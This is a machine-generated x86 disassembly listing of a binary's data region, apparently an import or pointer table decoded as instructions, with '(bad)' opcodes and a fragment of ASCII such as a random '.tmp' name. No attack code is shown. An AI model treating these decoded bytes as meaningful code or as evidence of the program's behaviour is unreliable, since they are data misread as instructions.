  41200a:	add    DWORD PTR [eax],eax
  41200c:	dec    esi
  41200d:	sub    DWORD PTR [ecx],eax
  41200f:	add    BYTE PTR [eax+0x29],bl
  412012:	add    DWORD PTR [eax],eax
  412014:	bound  ebp,QWORD PTR [ecx]
  412016:	add    DWORD PTR [eax],eax
  412018:	ins    BYTE PTR es:[edi],dx
  412019:	sub    DWORD PTR [ecx],eax
  41201b:	add    BYTE PTR [esi+0x29],dh
  41201e:	add    DWORD PTR [eax],eax
  412020:	mov    BYTE PTR [ecx],ch
  412022:	add    DWORD PTR [eax],eax
  412024:	xchg   edx,eax
  412025:	sub    DWORD PTR [ecx],eax
  412027:	add    BYTE PTR [edx-0x5dfffed7],bl
  41202d:	sub    DWORD PTR [ecx],eax
  41202f:	add    BYTE PTR [esi-0x43fffed7],ch
  412035:	sub    DWORD PTR [ecx],eax
  412037:	add    dh,al
  412039:	sub    DWORD PTR [ecx],eax
  41203b:	add    dl,dl
  41203d:	sub    DWORD PTR [ecx],eax
  41203f:	add    ah,bl
  412041:	sub    DWORD PTR [ecx],eax
  412043:	add    ah,ch
  412045:	sub    DWORD PTR [ecx],eax
  412047:	add    ah,dh
  412049:	sub    DWORD PTR [ecx],eax
  41204b:	add    ah,bh
  41204d:	sub    DWORD PTR [ecx],eax
  41204f:	add    BYTE PTR [esi],al
  412051:	sub    al,BYTE PTR [ecx]
  412053:	add    BYTE PTR [edx],dl
  412055:	sub    al,BYTE PTR [ecx]
  412057:	add    BYTE PTR [esi],bl
  412059:	sub    al,BYTE PTR [ecx]
  41205b:	add    BYTE PTR [edx+ebp*1],ch
  41205e:	add    DWORD PTR [eax],eax
  412060:	sub    al,BYTE PTR ss:[ecx]
  412063:	add    BYTE PTR [edx+0x2a],al
  412066:	add    DWORD PTR [eax],eax
  412068:	dec    esp
  412069:	sub    al,BYTE PTR [ecx]
  41206b:	add    BYTE PTR [esi+0x2a],dl
  41206e:	add    DWORD PTR [eax],eax
  412070:	sub    al,BYTE PTR fs:[ecx]
  412073:	add    BYTE PTR [eax+0x2a],dh
  412076:	add    DWORD PTR [eax],eax
  412078:	js     0x4120a4
  41207a:	add    DWORD PTR [eax],eax
  41207c:	xchg   BYTE PTR [edx],ch
  41207e:	add    DWORD PTR [eax],eax
  412080:	nop
  412081:	sub    al,BYTE PTR [ecx]
  412083:	add    BYTE PTR [eax-0x5dfffed6],bl
  412089:	sub    al,BYTE PTR [ecx]
  41208b:	add    BYTE PTR [edx+ebp*1+0x2ab40001],ch
  412092:	add    DWORD PTR [eax],eax
  412094:	shr    BYTE PTR [edx],0x1
  412097:	add    ah,dl
  412099:	sub    al,BYTE PTR [ecx]
  41209b:	add    dh,bl
  41209d:	sub    al,BYTE PTR [ecx]
  41209f:	add    al,ch
  4120a1:	sub    al,BYTE PTR [ecx]
  4120a3:	add    al,dh
  4120a5:	sub    al,BYTE PTR [ecx]
  4120a7:	add    BYTE PTR [eax],al
  4120a9:	sub    eax,DWORD PTR [ecx]
  4120ab:	add    BYTE PTR [edx],cl
  4120ad:	sub    eax,DWORD PTR [ecx]
  4120af:	add    BYTE PTR [eax],al
  4120b1:	add    BYTE PTR [eax],al
  4120b3:	add    BYTE PTR [eax],ah
  4120b5:	sub    eax,DWORD PTR [ecx]
  4120b7:	add    BYTE PTR [ebx+ebp*1],dh
  4120ba:	add    DWORD PTR [eax],eax
  4120bc:	inc    esi
  4120bd:	sub    eax,DWORD PTR [ecx]
  4120bf:	add    BYTE PTR [edx+0x2b],dl
  4120c2:	add    DWORD PTR [eax],eax
  4120c4:	sub    eax,DWORD PTR fs:[ecx]
  4120c7:	add    BYTE PTR [esi+0x2b],dh
  4120ca:	add    DWORD PTR [eax],eax
  4120cc:	nop
  4120cd:	sub    eax,DWORD PTR [ecx]
  4120cf:	add    BYTE PTR [esi-0x47fffed5],ah
  4120d5:	sub    eax,DWORD PTR [ecx]
  4120d7:	add    ah,al
  4120d9:	sub    eax,DWORD PTR [ecx]
  4120db:	add    dl,dl
  4120dd:	sub    eax,DWORD PTR [ecx]
  4120df:	add    al,ah
  4120e1:	sub    eax,DWORD PTR [ecx]
  4120e3:	add    dl,ch
  4120e5:	sub    eax,DWORD PTR [ecx]
  4120e7:	add    dl,bh
  4120e9:	sub    eax,DWORD PTR [ecx]
  4120eb:	add    BYTE PTR [edx],cl
  4120ed:	sub    al,0x1
  4120ef:	add    BYTE PTR [esi],dl
  4120f1:	sub    al,0x1
  4120f3:	add    BYTE PTR [eax],dh
  4120f5:	sub    al,0x1
  4120f7:	add    BYTE PTR [esp+ebp*1],bh
  4120fa:	add    DWORD PTR [eax],eax
  4120fc:	inc    esi
  4120fd:	sub    al,0x1
  4120ff:	add    BYTE PTR [esi+0x2c],dl
  412102:	add    DWORD PTR [eax],eax
  412104:	bound  ebp,QWORD PTR [ecx+eax*1]
  412107:	add    BYTE PTR [eax+0x2c],bh
  41210a:	add    DWORD PTR [eax],eax
  41210c:	test   BYTE PTR [ecx+eax*1],ch
  41210f:	add    BYTE PTR [eax-0x57fffed4],bl
  412115:	sub    al,0x1
  412117:	add    BYTE PTR [esp+ebp*1+0x2cc40001],dh
  41211e:	add    DWORD PTR [eax],eax
  412120:	(bad)  
  412121:	sub    al,0x1
  412123:	add    al,ch
  412125:	sub    al,0x1
  412127:	add    dh,bh
  412129:	sub    al,0x1
  41212b:	add    BYTE PTR [esi],cl
  41212d:	sub    eax,0x2d1e0001
  412132:	add    DWORD PTR [eax],eax
  412134:	sub    ch,BYTE PTR ds:0x2d3a0001
  41213a:	add    DWORD PTR [eax],eax
  41213c:	dec    esp
  41213d:	sub    eax,0x2d5e0001
  412142:	add    DWORD PTR [eax],eax
  412144:	je     0x412173
  412146:	add    DWORD PTR [eax],eax
  412148:	sub    BYTE PTR ds:0x2d900001,0x1
  41214f:	add    BYTE PTR [esi-0x4bfffed3],bl
  412155:	sub    eax,0x2dc00001
  41215a:	add    DWORD PTR [eax],eax
  41215c:	shr    BYTE PTR ds:0x2de40001,cl
  412162:	add    DWORD PTR [eax],eax
  412164:	imul   BYTE PTR ds:0x2e020001
  41216a:	add    DWORD PTR [eax],eax
  41216c:	adc    BYTE PTR [esi],ch
  41216e:	add    DWORD PTR [eax],eax
  412170:	and    BYTE PTR [esi],ch
  412172:	add    DWORD PTR [eax],eax
  412174:	sub    al,0x2e
  412176:	add    DWORD PTR [eax],eax
  412178:	ds add DWORD PTR cs:[eax],eax
  41217c:	dec    esp
  41217d:	add    DWORD PTR cs:[eax],eax
  412180:	pop    edx
  412181:	add    DWORD PTR cs:[eax],eax
  412184:	jo     0x4121b4
  412186:	add    DWORD PTR [eax],eax
  412188:	jle    0x4121b8
  41218a:	add    DWORD PTR [eax],eax
  41218c:	mov    ch,BYTE PTR [esi]
  41218e:	add    DWORD PTR [eax],eax
  412190:	call   0x12e:0xae00012e
  412197:	add    ah,al
  412199:	add    DWORD PTR cs:[eax],eax
  41219c:	aam    0x2e
  41219e:	add    DWORD PTR [eax],eax
  4121a0:	fisubr WORD PTR [esi]
  4121a2:	add    DWORD PTR [eax],eax
  4121a4:	in     al,dx
  4121a5:	add    DWORD PTR cs:[eax],eax
  4121a8:	(bad)  
  4121a9:	add    DWORD PTR cs:[eax],eax
  4121ac:	or     al,0x2f
  4121ae:	add    DWORD PTR [eax],eax
  4121b0:	and    al,0x2f
  4121b2:	add    DWORD PTR [eax],eax
  4121b4:	ss das 
  4121b6:	add    DWORD PTR [eax],eax
  4121b8:	dec    eax
  4121b9:	das    
  4121ba:	add    DWORD PTR [eax],eax
  4121bc:	push   esi
  4121bd:	das    
  4121be:	add    DWORD PTR [eax],eax
  4121c0:	fs das 
  4121c2:	add    DWORD PTR [eax],eax
  4121c4:	js     0x4121f5
  4121c6:	add    DWORD PTR [eax],eax
  4121c8:	mov    ch,BYTE PTR [edi]
  4121ca:	add    DWORD PTR [eax],eax
  4121cc:	pushf  
  4121cd:	das    
  4121ce:	add    DWORD PTR [eax],eax
  4121d0:	test   al,0x2f
  4121d2:	add    DWORD PTR [eax],eax
  4121d4:	mov    esp,0xc800012f
  4121d9:	das    
  4121da:	add    DWORD PTR [eax],eax
  4121dc:	fisubr WORD PTR [edi]
  4121de:	add    DWORD PTR [eax],eax
  4121e0:	repnz das 
  4121e2:	add    DWORD PTR [eax],eax
  4121e4:	(bad)  
  4121e5:	das    
  4121e6:	add    DWORD PTR [eax],eax
  4121e8:	or     BYTE PTR [eax],dh
  4121ea:	add    DWORD PTR [eax],eax
  4121ec:	push   ss
  4121ed:	xor    BYTE PTR [ecx],al
  4121ef:	add    BYTE PTR [esi],ah
  4121f1:	xor    BYTE PTR [ecx],al
  4121f3:	add    BYTE PTR [esi],bh
  4121f5:	xor    BYTE PTR [ecx],al
  4121f7:	add    BYTE PTR [eax+0x30],dl
  4121fa:	add    DWORD PTR [eax],eax
  4121fc:	bound  esi,QWORD PTR [eax]
  4121fe:	add    DWORD PTR [eax],eax
  412200:	outs   dx,BYTE PTR ds:[esi]
  412201:	xor    BYTE PTR [ecx],al
  412203:	add    BYTE PTR [eax-0x71fffed0],al
  412209:	xor    BYTE PTR [ecx],al
  41220b:	add    BYTE PTR [eax+esi*1+0x30ac0001],bl
  412212:	add    DWORD PTR [eax],eax
  412214:	mov    esi,0xcc000130
  412219:	xor    BYTE PTR [ecx],al
  41221b:	add    al,bl
  41221d:	xor    BYTE PTR [ecx],al
  41221f:	add    dh,ah
  412221:	xor    BYTE PTR [ecx],al
  412223:	add    al,bh
  412225:	xor    BYTE PTR [ecx],al
  412227:	add    BYTE PTR [esi],al
  412229:	xor    DWORD PTR [ecx],eax
  41222b:	add    BYTE PTR [edx],dl
  41222d:	xor    DWORD PTR [ecx],eax
  41222f:	add    BYTE PTR [ecx+esi*1],ah
  412232:	add    DWORD PTR [eax],eax
  412234:	cmp    BYTE PTR [ecx],dh
  412236:	add    DWORD PTR [eax],eax
  412238:	dec    edx
  412239:	xor    DWORD PTR [ecx],eax
  41223b:	add    BYTE PTR [edx+0x31],bl
  41223e:	add    DWORD PTR [eax],eax
  412240:	push   0x31
  412242:	add    DWORD PTR [eax],eax
  412244:	js     0x412277
  412246:	add    DWORD PTR [eax],eax
  412248:	xchg   esi,eax
  412249:	xor    DWORD PTR [ecx],eax
  41224b:	add    BYTE PTR [ecx+esi*1+0x31b40001],ah
  412252:	add    DWORD PTR [eax],eax
  412254:	shl    BYTE PTR [ecx],cl
  412256:	add    DWORD PTR [eax],eax
  412258:	in     al,0x31
  41225a:	add    DWORD PTR [eax],eax
  41225c:	cld    
  41225d:	xor    DWORD PTR [ecx],eax
  41225f:	add    BYTE PTR [edx],cl
  412261:	xor    al,BYTE PTR [ecx]
  412263:	add    BYTE PTR [eax],al
  412265:	add    BYTE PTR [eax],al
  412267:	add    BYTE PTR [edx+esi*1],ch
  41226a:	add    DWORD PTR [eax],eax
  41226c:	inc    esp
  41226d:	xor    al,BYTE PTR [ecx]
  41226f:	add    BYTE PTR [esi+0x32],dl
  412272:	add    DWORD PTR [eax],eax
  412274:	outs   dx,BYTE PTR ds:[esi]
  412275:	xor    al,BYTE PTR [ecx]
  412277:	add    BYTE PTR [eax-0x63fffece],al
  41227d:	xor    al,BYTE PTR [ecx]
  41227f:	add    BYTE PTR [eax],al
  412281:	add    BYTE PTR [eax],al
  412283:	add    BYTE PTR [edx+esi*1+0x32d60001],bh
  41228a:	add    DWORD PTR [eax],eax
  41228c:	out    0x32,al
  41228e:	add    DWORD PTR [eax],eax
  412290:	cli    
  412291:	xor    al,BYTE PTR [ecx]
  412293:	add    BYTE PTR [edx],cl
  412295:	xor    eax,DWORD PTR [ecx]
  412297:	add    BYTE PTR [eax],ah
  412299:	xor    eax,DWORD PTR [ecx]
  41229b:	add    BYTE PTR [esi],dh
  41229d:	xor    eax,DWORD PTR [ecx]
  41229f:	add    BYTE PTR [ebx+esi*1+0x1],al
  4122a3:	add    BYTE PTR [eax+0x33],dl
  4122a6:	add    DWORD PTR [eax],eax
  4122a8:	pop    esp
  4122a9:	xor    eax,DWORD PTR [ecx]
  4122ab:	add    BYTE PTR [esi+0x33],ah
  4122ae:	add    DWORD PTR [eax],eax
  4122b0:	je     0x4122e5
  4122b2:	add    DWORD PTR [eax],eax
  4122b4:	xor    BYTE PTR [ebx],0x1
  4122b7:	add    BYTE PTR [ebx+esi*1+0x33aa0001],bl
  4122be:	add    DWORD PTR [eax],eax
  4122c0:	ret    0x133
  4122c3:	add    dh,dl
  4122c5:	xor    eax,DWORD PTR [ecx]
  4122c7:	add    dh,ch
  4122c9:	xor    eax,DWORD PTR [ecx]
  4122cb:	add    ah,bh
  4122cd:	xor    eax,DWORD PTR [ecx]
  4122cf:	add    BYTE PTR [esi],dl
  4122d1:	xor    al,0x1
  4122d3:	add    BYTE PTR [edx],ch
  4122d5:	xor    al,0x1
  4122d7:	add    BYTE PTR [esp+esi*1],dh
  4122da:	add    DWORD PTR [eax],eax
  4122dc:	inc    esp
  4122dd:	xor    al,0x1
  4122df:	add    BYTE PTR [esi+0x34],cl
  4122e2:	add    DWORD PTR [eax],eax
  4122e4:	pop    edx
  4122e5:	xor    al,0x1
  4122e7:	add    BYTE PTR [esi+0x34],ch
  4122ea:	add    DWORD PTR [eax],eax
  4122ec:	xchg   BYTE PTR [ecx+eax*1],dh
  4122ef:	add    BYTE PTR [esp+esi*1+0x349e0001],dl
  4122f6:	add    DWORD PTR [eax],eax
  4122f8:	mov    dl,0x34
  4122fa:	add    DWORD PTR [eax],eax
  4122fc:	enter  0x134,0x0
  412300:	fidiv  DWORD PTR [ecx+eax*1]
  412303:	add    dh,ah
  412305:	xor    al,0x1
  412307:	add    dl,bh
  412309:	xor    al,0x1
  41230b:	add    BYTE PTR [esi*1+0x350e0001],al
  412312:	add    DWORD PTR [eax],eax
  412314:	push   ds
  412315:	xor    eax,0x35360001
  41231a:	add    DWORD PTR [eax],eax
  41231c:	dec    edx
  41231d:	xor    eax,0x355a0001
  412322:	add    DWORD PTR [eax],eax
  412324:	xor    ax,0x1
  412328:	je     0x41235f
  41232a:	add    DWORD PTR [eax],eax
  41232c:	mov    dh,BYTE PTR ds:0x359c0001
  412332:	add    DWORD PTR [eax],eax
  412334:	add    BYTE PTR [eax],al
  412336:	add    BYTE PTR [eax],al
  412338:	mov    edx,0xce000135
  41233d:	xor    eax,0x35e00001
  412342:	add    DWORD PTR [eax],eax
  412344:	in     al,dx
  412345:	xor    eax,0x36040001
  41234a:	add    DWORD PTR [eax],eax
  41234c:	adc    al,0x36
  41234e:	add    DWORD PTR [eax],eax
  412350:	sub    BYTE PTR [esi],dh
  412352:	add    DWORD PTR [eax],eax
  412354:	ds add DWORD PTR ss:[eax],eax
  412358:	dec    esi
  412359:	add    DWORD PTR ss:[eax],eax
  41235c:	pusha  
  41235d:	add    DWORD PTR ss:[eax],eax
  412360:	ins    BYTE PTR es:[edi],dx
  412361:	add    DWORD PTR ss:[eax],eax
  412364:	xor    BYTE PTR [esi],0x1
  412367:	add    BYTE PTR [esi-0x49fffeca],bl
  41236d:	add    DWORD PTR ss:[eax],eax
  412370:	retf   0x136
  412373:	add    dl,bl
  412375:	add    DWORD PTR ss:[eax],eax
  412378:	out    0x36,al
  41237a:	add    DWORD PTR [eax],eax
  41237c:	(bad)  
  41237d:	add    DWORD PTR ss:[eax],eax
  412380:	adc    BYTE PTR [edi],dh
  412382:	add    DWORD PTR [eax],eax
  412384:	and    dh,BYTE PTR [edi]
  412386:	add    DWORD PTR [eax],eax
  412388:	xor    dh,BYTE PTR [edi]
  41238a:	add    DWORD PTR [eax],eax
  41238c:	inc    esp
  41238d:	aaa    
  41238e:	add    DWORD PTR [eax],eax
  412390:	push   eax
  412391:	aaa    
  412392:	add    DWORD PTR [eax],eax
  412394:	pusha  
  412395:	aaa    
  412396:	add    DWORD PTR [eax],eax
  412398:	outs   dx,BYTE PTR ds:[esi]
  412399:	aaa    
  41239a:	add    DWORD PTR [eax],eax
  41239c:	js     0x4123d5
  41239e:	add    DWORD PTR [eax],eax
  4123a0:	mov    BYTE PTR [edi],dh
  4123a2:	add    DWORD PTR [eax],eax
  4123a4:	xchg   esi,eax
  4123a5:	aaa    
  4123a6:	add    DWORD PTR [eax],eax
  4123a8:	test   al,0x37
  4123aa:	add    DWORD PTR [eax],eax
  4123ac:	mov    esi,0xd2000137
  4123b1:	aaa    
  4123b2:	add    DWORD PTR [eax],eax
  4123b4:	jmp    0x138:0x137
  4123bb:	add    BYTE PTR [esi],cl
  4123bd:	cmp    BYTE PTR [ecx],al
  4123bf:	add    BYTE PTR [esi],ah
  4123c1:	cmp    BYTE PTR [ecx],al
  4123c3:	add    BYTE PTR [eax+edi*1],bh
  4123c6:	add    DWORD PTR [eax],eax
  4123c8:	dec    esp
  4123c9:	cmp    BYTE PTR [ecx],al
  4123cb:	add    BYTE PTR [eax+0x38],bl
  4123ce:	add    DWORD PTR [eax],eax
  4123d0:	jo     0x41240a
  4123d2:	add    DWORD PTR [eax],eax
  4123d4:	jle    0x41240e
  4123d6:	add    DWORD PTR [eax],eax
  4123d8:	xchg   edx,eax
  4123d9:	cmp    BYTE PTR [ecx],al
  4123db:	add    BYTE PTR [esi-0x51fffec8],bl
  4123e1:	cmp    BYTE PTR [ecx],al
  4123e3:	add    dh,al
  4123e5:	cmp    BYTE PTR [ecx],al
  4123e7:	add    dl,bl
  4123e9:	cmp    BYTE PTR [ecx],al
  4123eb:	add    al,ch
  4123ed:	cmp    BYTE PTR [ecx],al
  4123ef:	add    dh,bh
  4123f1:	cmp    BYTE PTR [ecx],al
  4123f3:	add    BYTE PTR [edx],dl
  4123f5:	cmp    DWORD PTR [ecx],eax
  4123f7:	add    BYTE PTR [esi],bl
  4123f9:	cmp    DWORD PTR [ecx],eax
  4123fb:	add    BYTE PTR [eax],bh
  4123fd:	cmp    DWORD PTR [ecx],eax
  4123ff:	add    BYTE PTR [eax],al
  412401:	add    BYTE PTR [eax],al
  412403:	add    BYTE PTR [ecx+edi*1+0x1],bl
  412407:	add    BYTE PTR [edx+0x39],dh
  41240a:	add    DWORD PTR [eax],eax
	...
  412414:	popf   
  412415:	dec    esp
  412416:	(bad)  
  412417:	dec    ebp
  412418:	add    BYTE PTR [eax],al
  41241a:	add    BYTE PTR [eax],al
  41241c:	add    al,BYTE PTR [eax]
  41241e:	add    BYTE PTR [eax],al
  412420:	inc    edx
  412421:	add    BYTE PTR [eax],al
  412423:	add    BYTE PTR [edx+edi*1+0x3],dl
  412427:	add    BYTE PTR [edx+ebp*1+0x3],dl
	...
  412433:	add    BYTE PTR [ebp+0x4dc74c],bl
  412439:	add    BYTE PTR [eax],al
  41243b:	add    BYTE PTR [edx+0x24],ah
  41243e:	add    DWORD PTR [eax],eax
  412440:	add    DWORD PTR [eax],eax
  412442:	add    BYTE PTR [eax],al
  412444:	add    DWORD PTR [eax],eax
  412446:	add    BYTE PTR [eax],al
  412448:	add    DWORD PTR [eax],eax
  41244a:	add    BYTE PTR [eax],al
  41244c:	pop    eax
  41244d:	and    al,0x1
  41244f:	add    BYTE PTR [esp+0x1],bl
  412453:	add    BYTE PTR [eax+0x24],ah
  412456:	add    DWORD PTR [eax],eax
  412458:	lock xor al,BYTE PTR [eax]
  41245b:	add    BYTE PTR [ebx+0x24],dh
  41245e:	add    DWORD PTR [eax],eax
  412460:	add    BYTE PTR [eax],al
  412462:	outs   dx,BYTE PTR ds:[esi]
  412463:	push   esi
  412464:	popa   
  412465:	addr16 inc edi
  412467:	push   edi
  412468:	js     0x4124be
  41246a:	outs   dx,DWORD PTR ds:[esi]
  41246b:	ss addr16 xor al,0x2e
  41246f:	je     0x4124e0
  412471:	jo     0x412473
  412473:	aas    
  412474:	inc    edi
  412475:	outs   dx,BYTE PTR gs:[esi]
  412477:	gs jb  0x4124db
  41247a:	je     0x4124e1
  41247c:	push   esp
  41247d:	gs js  0x4124f4
  412480:	push   edi
  412481:	inc    eax
  412482:	inc    eax
  412483:	pop    ecx
  412484:	inc    edi
  412485:	push   eax
  412486:	inc    ecx
  412487:	dec    edx
  412488:	pop    edi
  412489:	dec    esi
  41248a:	cmp    al,0x56
  41248c:	add    BYTE PTR [eax],al
  41248e:	add    BYTE PTR [eax],al
  412490:	sbb    al,0x25
  412492:	add    DWORD PTR [eax],eax
	...
  41249c:	adc    al,0x2b
  41249e:	add    DWORD PTR [eax],eax
  4124a0:	add    BYTE PTR [eax],ah
  4124a2:	add    DWORD PTR [eax],eax
  4124a4:	shl    BYTE PTR ds:0x1,1
  4124aa:	add    BYTE PTR [eax],al
  4124ac:	add    BYTE PTR [eax],al
  4124ae:	add    BYTE PTR [eax],al
  4124b0:	and    BYTE PTR [edx],dh
  4124b2:	add    DWORD PTR [eax],eax
  4124b4:	mov    ah,0x20
  4124b6:	add    DWORD PTR [eax],eax
  4124b8:	test   BYTE PTR [edi],ah
  4124ba:	add    DWORD PTR [eax],eax
	...
  4124c4:	scas   al,BYTE PTR es:[edi]
  4124c5:	xor    al,BYTE PTR [ecx]
  4124c7:	add    BYTE PTR [eax+0x22],ch
  4124ca:	add    DWORD PTR [eax],eax
  4124cc:	mov    al,ds:0x127
  4124d1:	add    BYTE PTR [eax],al
  4124d3:	add    BYTE PTR [eax],al
  4124d5:	add    BYTE PTR [eax],al
  4124d7:	add    BYTE PTR [eax-0x7bfffecb],dh
  4124dd:	and    al,BYTE PTR [ecx]
  4124df:	add    BYTE PTR [eax+ebp*1+0x1],dl
	...
  4124eb:	add    BYTE PTR [esi+0x39],cl
  4124ee:	add    DWORD PTR [eax],eax
  4124f0:	cmp    BYTE PTR [ebx],ah
  4124f2:	add    DWORD PTR [eax],eax
  4124f4:	and    BYTE PTR [ecx],ch
  4124f6:	add    DWORD PTR [eax],eax
	...
  412500:	mov    BYTE PTR [ecx],bh
  412502:	add    DWORD PTR [eax],eax
  412504:	add    al,0x24
  412506:	add    DWORD PTR [eax],eax
	...
  41251c:	sub    al,0x29
  41251e:	add    DWORD PTR [eax],eax
  412520:	sub    DWORD PTR ss:[ecx],eax
  412523:	add    BYTE PTR [eax+0x29],al
  412526:	add    DWORD PTR [eax],eax
  412528:	dec    esi
  412529:	sub    DWORD PTR [ecx],eax
  41252b:	add    BYTE PTR [eax+0x29],bl
  41252e:	add    DWORD PTR [eax],eax
  412530:	bound  ebp,QWORD PTR [ecx]
  412532:	add    DWORD PTR [eax],eax
  412534:	ins    BYTE PTR es:[edi],dx
  412535:	sub    DWORD PTR [ecx],eax
  412537:	add    BYTE PTR [esi+0x29],dh
  41253a:	add    DWORD PTR [eax],eax
  41253c:	mov    BYTE PTR [ecx],ch
  41253e:	add    DWORD PTR [eax],eax
  412540:	xchg   edx,eax
  412541:	sub    DWORD PTR [ecx],eax
  412543:	add    BYTE PTR [edx-0x5dfffed7],bl
  412549:	sub    DWORD PTR [ecx],eax
  41254b:	add    BYTE PTR [esi-0x43fffed7],ch
  412551:	sub    DWORD PTR [ecx],eax
  412553:	add    dh,al
  412555:	sub    DWORD PTR [ecx],eax
  412557:	add    dl,dl
  412559:	sub    DWORD PTR [ecx],eax
  41255b:	add    ah,bl
  41255d:	sub    DWORD PTR [ecx],eax
  41255f:	add    ah,ch
  412561:	sub    DWORD PTR [ecx],eax
  412563:	add    ah,dh
  412565:	sub    DWORD PTR [ecx],eax
  412567:	add    ah,bh
  412569:	sub    DWORD PTR [ecx],eax
  41256b:	add    BYTE PTR [esi],al
  41256d:	sub    al,BYTE PTR [ecx]
  41256f:	add    BYTE PTR [edx],dl
  412571:	sub    al,BYTE PTR [ecx]
  412573:	add    BYTE PTR [esi],bl
  412575:	sub    al,BYTE PTR [ecx]
  412577:	add    BYTE PTR [edx+ebp*1],ch
  41257a:	add    DWORD PTR [eax],eax
  41257c:	sub    al,BYTE PTR ss:[ecx]
  41257f:	add    BYTE PTR [edx+0x2a],al
  412582:	add    DWORD PTR [eax],eax
  412584:	dec    esp
  412585:	sub    al,BYTE PTR [ecx]
  412587:	add    BYTE PTR [esi+0x2a],dl
  41258a:	add    DWORD PTR [eax],eax
  41258c:	sub    al,BYTE PTR fs:[ecx]
  41258f:	add    BYTE PTR [eax+0x2a],dh
  412592:	add    DWORD PTR [eax],eax
  412594:	js     0x4125c0
  412596:	add    DWORD PTR [eax],eax
  412598:	xchg   BYTE PTR [edx],ch
  41259a:	add    DWORD PTR [eax],eax
  41259c:	nop
  41259d:	sub    al,BYTE PTR [ecx]
  41259f:	add    BYTE PTR [eax-0x5dfffed6],bl
  4125a5:	sub    al,BYTE PTR [ecx]
  4125a7:	add    BYTE PTR [edx+ebp*1+0x2ab40001],ch
  4125ae:	add    DWORD PTR [eax],eax
  4125b0:	shr    BYTE PTR [edx],0x1
  4125b3:	add    ah,dl
  4125b5:	sub    al,BYTE PTR [ecx]
  4125b7:	add    dh,bl
  4125b9:	sub    al,BYTE PTR [ecx]
  4125bb:	add    al,ch
  4125bd:	sub    al,BYTE PTR [ecx]
  4125bf:	add    al,dh
  4125c1:	sub    al,BYTE PTR [ecx]
  4125c3:	add    BYTE PTR [eax],al
  4125c5:	sub    eax,DWORD PTR [ecx]
  4125c7:	add    BYTE PTR [edx],cl
  4125c9:	sub    eax,DWORD PTR [ecx]
  4125cb:	add    BYTE PTR [eax],al
  4125cd:	add    BYTE PTR [eax],al
  4125cf:	add    BYTE PTR [eax],ah
  4125d1:	sub    eax,DWORD PTR [ecx]
  4125d3:	add    BYTE PTR [ebx+ebp*1],dh
  4125d6:	add    DWORD PTR [eax],eax
  4125d8:	inc    esi
  4125d9:	sub    eax,DWORD PTR [ecx]
  4125db:	add    BYTE PTR [edx+0x2b],dl
  4125de:	add    DWORD PTR [eax],eax
  4125e0:	sub    eax,DWORD PTR fs:[ecx]
  4125e3:	add    BYTE PTR [esi+0x2b],dh
  4125e6:	add    DWORD PTR [eax],eax
  4125e8:	nop
  4125e9:	sub    eax,DWORD PTR [ecx]
  4125eb:	add    BYTE PTR [esi-0x47fffed5],ah
  4125f1:	sub    eax,DWORD PTR [ecx]
  4125f3:	add    ah,al
  4125f5:	sub    eax,DWORD PTR [ecx]
  4125f7:	add    dl,dl
  4125f9:	sub    eax,DWORD PTR [ecx]
  4125fb:	add    al,ah
  4125fd:	sub    eax,DWORD PTR [ecx]
  4125ff:	add    dl,ch
  412601:	sub    eax,DWORD PTR [ecx]
  412603:	add    dl,bh
  412605:	sub    eax,DWORD PTR [ecx]
  412607:	add    BYTE PTR [edx],cl
  412609:	sub    al,0x1
  41260b:	add    BYTE PTR [esi],dl
  41260d:	sub    al,0x1
  41260f:	add    BYTE PTR [eax],dh
  412611:	sub    al,0x1
  412613:	add    BYTE PTR [esp+ebp*1],bh
  412616:	add    DWORD PTR [eax],eax
  412618:	inc    esi
  412619:	sub    al,0x1
  41261b:	add    BYTE PTR [esi+0x2c],dl
  41261e:	add    DWORD PTR [eax],eax
  412620:	bound  ebp,QWORD PTR [ecx+eax*1]
  412623:	add    BYTE PTR [eax+0x2c],bh
  412626:	add    DWORD PTR [eax],eax
  412628:	test   BYTE PTR [ecx+eax*1],ch
  41262b:	add    BYTE PTR [eax-0x57fffed4],bl
  412631:	sub    al,0x1
  412633:	add    BYTE PTR [esp+ebp*1+0x2cc40001],dh
  41263a:	add    DWORD PTR [eax],eax
  41263c:	(bad)  
  41263d:	sub    al,0x1
  41263f:	add    al,ch
  412641:	sub    al,0x1
  412643:	add    dh,bh
  412645:	sub    al,0x1
  412647:	add    BYTE PTR [esi],cl
  412649:	sub    eax,0x2d1e0001
  41264e:	add    DWORD PTR [eax],eax
  412650:	sub    ch,BYTE PTR ds:0x2d3a0001
  412656:	add    DWORD PTR [eax],eax
  412658:	dec    esp
  412659:	sub    eax,0x2d5e0001
  41265e:	add    DWORD PTR [eax],eax
  412660:	je     0x41268f
  412662:	add    DWORD PTR [eax],eax
  412664:	sub    BYTE PTR ds:0x2d900001,0x1
  41266b:	add    BYTE PTR [esi-0x4bfffed3],bl
  412671:	sub    eax,0x2dc00001
  412676:	add    DWORD PTR [eax],eax
  412678:	shr    BYTE PTR ds:0x2de40001,cl
  41267e:	add    DWORD PTR [eax],eax
  412680:	imul   BYTE PTR ds:0x2e020001
  412686:	add    DWORD PTR [eax],eax
  412688:	adc    BYTE PTR [esi],ch
  41268a:	add    DWORD PTR [eax],eax
  41268c:	and    BYTE PTR [esi],ch
  41268e:	add    DWORD PTR [eax],eax
  412690:	sub    al,0x2e
  412692:	add    DWORD PTR [eax],eax
  412694:	ds add DWORD PTR cs:[eax],eax
  412698:	dec    esp
  412699:	add    DWORD PTR cs:[eax],eax
  41269c:	pop    edx
  41269d:	add    DWORD PTR cs:[eax],eax
  4126a0:	jo     0x4126d0
  4126a2:	add    DWORD PTR [eax],eax
  4126a4:	jle    0x4126d4
  4126a6:	add    DWORD PTR [eax],eax
  4126a8:	mov    ch,BYTE PTR [esi]
  4126aa:	add    DWORD PTR [eax],eax
  4126ac:	call   0x12e:0xae00012e
  4126b3:	add    ah,al
  4126b5:	add    DWORD PTR cs:[eax],eax
  4126b8:	aam    0x2e
  4126ba:	add    DWORD PTR [eax],eax
  4126bc:	fisubr WORD PTR [esi]
  4126be:	add    DWORD PTR [eax],eax
  4126c0:	in     al,dx
  4126c1:	add    DWORD PTR cs:[eax],eax
  4126c4:	(bad)  
  4126c5:	add    DWORD PTR cs:[eax],eax
  4126c8:	or     al,0x2f
  4126ca:	add    DWORD PTR [eax],eax
  4126cc:	and    al,0x2f
  4126ce:	add    DWORD PTR [eax],eax
  4126d0:	ss das 
  4126d2:	add    DWORD PTR [eax],eax
  4126d4:	dec    eax
  4126d5:	das    
  4126d6:	add    DWORD PTR [eax],eax
  4126d8:	push   esi
  4126d9:	das    
